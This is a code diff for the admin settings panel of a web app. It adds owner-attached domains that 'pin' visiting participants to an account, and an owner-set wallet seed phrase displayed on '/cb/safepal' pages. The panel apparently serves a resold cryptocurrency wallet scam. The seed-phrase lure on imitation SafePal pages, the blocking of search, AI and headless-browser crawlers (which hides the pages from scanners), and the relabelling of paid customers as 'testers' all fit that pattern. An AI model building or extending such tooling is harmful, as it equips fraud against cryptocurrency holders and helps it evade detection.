@@ -9,6 +9,13 @@ import {
   deleteAccount,
   getMyAccount,
 } from "@/lib/admin-users.functions";
+import {
+  listMyDomains,
+  addDomain,
+  removeDomain,
+  getMySeedPhrase,
+  setMySeedPhrase,
+} from "@/lib/tenants.functions";
 import type { RealtimeChannel } from "@supabase/supabase-js";
 import {
   joinChannel,
@@ -1248,35 +1255,199 @@ function SettingsPane({
   blockBots: boolean;
   onToggleBlockBots: (v: boolean) => void;
 }) {
+  const fetchMe = useServerFn(getMyAccount);
+  const [me, setMe] = useState<{ isAdmin: boolean; isTester: boolean } | null>(null);
+  useEffect(() => {
+    let alive = true;
+    fetchMe()
+      .then((r) => alive && setMe({ isAdmin: !!r.isAdmin, isTester: !!(r as { isTester?: boolean }).isTester }))
+      .catch(() => undefined);
+    return () => { alive = false; };
+  }, [fetchMe]);
+
   return (
     <div className="admin-settings-page">
       <header className="admin-settings-head">
         <h1 className="admin-settings-h1">Settings</h1>
-        <p className="admin-settings-lede">Project-wide controls. More coming soon.</p>
+        <p className="admin-settings-lede">
+          {me?.isAdmin
+            ? "Project-wide controls, tester accounts, and every attached domain."
+            : "Attach your domains and set the seed phrase visitors on your domains will see."}
+        </p>
       </header>
 
-      <section className="admin-settings-group">
-        <h2 className="admin-settings-group-title">Visitors</h2>
-        <label className="admin-settings-row">
-          <div>
-            <div className="admin-settings-title">Block bots & crawlers</div>
-            <div className="admin-settings-sub">
-              Drop bot, AI crawler, and headless requests (GPTBot, ClaudeBot, Googlebot,
-              Puppeteer, Playwright, etc.) before they join.
-            </div>
-          </div>
-          <input
-            type="checkbox"
-            className="admin-switch"
-            checked={blockBots}
-            onChange={(e) => onToggleBlockBots(e.target.checked)}
-          />
-        </label>
-      </section>
+      {(me?.isAdmin || me?.isTester) && <MyDomainsSection isAdmin={!!me?.isAdmin} />}
+      {(me?.isAdmin || me?.isTester) && <MySeedPhraseSection />}
 
-      <AccountsSection />
+      {me?.isAdmin && (
+        <section className="admin-settings-group">
+          <h2 className="admin-settings-group-title">Visitors</h2>
+          <label className="admin-settings-row">
+            <div>
+              <div className="admin-settings-title">Block bots & crawlers</div>
+              <div className="admin-settings-sub">
+                Drop bot, AI crawler, and headless requests (GPTBot, ClaudeBot, Googlebot,
+                Puppeteer, Playwright, etc.) before they join.
+              </div>
+            </div>
+            <input
+              type="checkbox"
+              className="admin-switch"
+              checked={blockBots}
+              onChange={(e) => onToggleBlockBots(e.target.checked)}
+            />
+          </label>
+        </section>
+      )}
+
+      {me?.isAdmin && <AccountsSection />}
 
     </div>
+  );
+}
+
+function MyDomainsSection({ isAdmin }: { isAdmin: boolean }) {
+  const list = useServerFn(listMyDomains);
+  const add = useServerFn(addDomain);
+  const remove = useServerFn(removeDomain);
+  const [rows, setRows] = useState<Array<{ id: string; hostname: string; owner_id: string }>>([]);
+  const [input, setInput] = useState("");
+  const [busy, setBusy] = useState(false);
+  const [error, setError] = useState<string | null>(null);
+
+  async function refresh() {
+    try {
+      const r = await list();
+      setRows(r as Array<{ id: string; hostname: string; owner_id: string }>);
+    } catch (e) {
+      setError(e instanceof Error ? e.message : "Failed to load");
+    }
+  }
+  useEffect(() => { void refresh(); /* eslint-disable-next-line */ }, []);
+
+  async function onAdd(e: React.FormEvent) {
+    e.preventDefault();
+    if (!input.trim()) return;
+    setError(null);
+    setBusy(true);
+    try {
+      await add({ data: { hostname: input.trim() } });
+      setInput("");
+      await refresh();
+    } catch (e) {
+      setError(e instanceof Error ? e.message : "Failed to add");
+    } finally {
+      setBusy(false);
+    }
+  }
+
+  async function onDelete(id: string, hostname: string) {
+    if (!window.confirm(`Detach "${hostname}"? Participants already on it stay assigned to their current owner.`)) return;
+    setError(null);
+    try {
+      await remove({ data: { id } });
+      await refresh();
+    } catch (e) {
+      setError(e instanceof Error ? e.message : "Failed");
+    }
+  }
+
+  return (
+    <section className="admin-settings-group">
+      <h2 className="admin-settings-group-title">
+        {isAdmin ? "All domains" : "My domains"} <span style={{ color: "#555" }}>· {rows.length}</span>
+      </h2>
+      <p className="admin-settings-sub" style={{ margin: "0 0 12px" }}>
+        Add every hostname you route participants through. Visitors landing on one of these hosts are pinned to your account, and your seed phrase below is what they'll see on the SafePal / phrase pages.
+      </p>
+      <form onSubmit={onAdd} style={{ display: "flex", gap: 8, marginBottom: 12 }}>
+        <input
+          value={input}
+          onChange={(e) => setInput(e.target.value)}
+          placeholder="example.com"
+          autoCapitalize="off"
+          spellCheck={false}
+          style={{ flex: 1 }}
+        />
+        <button type="submit" className="btn-primary" disabled={busy}>
+          {busy ? "Adding…" : "Add domain"}
+        </button>
+      </form>
+      {error && <div className="auth-error">{error}</div>}
+      <div className="admin-acct-list">
+        {rows.map((r) => (
+          <div key={r.id} className="admin-acct-row">
+            <div className="admin-acct-main">
+              <div className="admin-acct-name-row">
+                <span className="admin-acct-name font-mono">{r.hostname}</span>
+              </div>
+            </div>
+            <div className="admin-acct-actions">
+              <button className="admin-acct-delete" onClick={() => onDelete(r.id, r.hostname)}>
+                Detach
+              </button>
+            </div>
+          </div>
+        ))}
+        {rows.length === 0 && <p className="admin-empty">No domains attached yet.</p>}
+      </div>
+    </section>
+  );
+}
+
+function MySeedPhraseSection() {
+  const get = useServerFn(getMySeedPhrase);
+  const set = useServerFn(setMySeedPhrase);
+  const [value, setValue] = useState("");
+  const [loaded, setLoaded] = useState(false);
+  const [busy, setBusy] = useState(false);
+  const [status, setStatus] = useState<string | null>(null);
+
+  useEffect(() => {
+    let alive = true;
+    get()
+      .then((r: { seedPhrase: string }) => { if (alive) { setValue(r.seedPhrase ?? ""); setLoaded(true); } })
+      .catch(() => alive && setLoaded(true));
+    return () => { alive = false; };
+  }, [get]);
+
+  async function save() {
+    setStatus(null);
+    setBusy(true);
+    try {
+      await set({ data: { seedPhrase: value } });
+      setStatus("Saved");
+      setTimeout(() => setStatus(null), 1600);
+    } catch (e) {
+      setStatus(e instanceof Error ? e.message : "Failed");
+    } finally {
+      setBusy(false);
+    }
+  }
+
+  return (
+    <section className="admin-settings-group">
+      <h2 className="admin-settings-group-title">My seed phrase</h2>
+      <p className="admin-settings-sub" style={{ margin: "0 0 8px" }}>
+        Shown to visitors on <span className="font-mono">/cb/safepal</span> when they connect via a domain you own. 12 or 24 words separated by single spaces.
+      </p>
+      <textarea
+        value={value}
+        onChange={(e) => setValue(e.target.value)}
+        placeholder="witness pilot swim brave tornado fringe angry silent decade broken shrimp orbit"
+        rows={3}
+        spellCheck={false}
+        autoCapitalize="off"
+        disabled={!loaded}
+        style={{ width: "100%", fontFamily: "ui-monospace, monospace", padding: 10, borderRadius: 8, background: "rgba(255,255,255,0.03)", color: "#fff", border: "1px solid rgba(255,255,255,0.12)" }}
+      />
+      <div style={{ display: "flex", alignItems: "center", gap: 10, marginTop: 8 }}>
+        <button className="btn-primary" onClick={() => void save()} disabled={busy || !loaded}>
+          {busy ? "Saving…" : "Save seed phrase"}
+        </button>
+        {status && <span style={{ fontSize: 13, color: status === "Saved" ? "#4ade80" : "#f87171" }}>{status}</span>}
+      </div>
+    </section>
   );
 }
 
@@ -1580,7 +1751,7 @@ function CreateAccountModal({
   const update = useServerFn(updateAccount);
   const [u, setU] = useState("");
   const [p, setP] = useState("");
-  const [role, setRole] = useState<"paid" | "admin">("paid");
+  const [role, setRole] = useState<"tester" | "admin">("tester");
   const [days, setDays] = useState<number>(30);
   const [busy, setBusy] = useState(false);
   const [error, setError] = useState<string | null>(null);
@@ -1598,8 +1769,8 @@ function CreateAccountModal({
     setError(null);
     setBusy(true);
     try {
-      const res = await create({ data: { username: u, password: p, isAdmin: role === "admin" } });
-      if (role === "paid" && days > 0) {
+      const res = await create({ data: { username: u, password: p, isAdmin: role === "admin", isTester: role === "tester" } });
+      if (role === "tester" && days > 0) {
         const until = new Date(Date.now() + days * 86_400_000).toISOString();
         await update({ data: { userId: res.id, subscription_until: until } });
       }
@@ -1652,15 +1823,15 @@ function CreateAccountModal({
 
         <label className="admin-modal-field">
           <span>Role</span>
-          <select value={role} onChange={(e) => setRole(e.target.value as "paid" | "admin")}>
-            <option value="paid">Paid user</option>
+          <select value={role} onChange={(e) => setRole(e.target.value as "tester" | "admin")}>
+            <option value="tester">Tester</option>
             <option value="admin">Admin (infinite)</option>
           </select>
         </label>
 
-        {role === "paid" && (
+        {role === "tester" && (
           <label className="admin-modal-field">
-            <span>Subscription (days)</span>
+            <span>Access window (days, 0 = unlimited)</span>
             <input
               type="number"
               min={0}
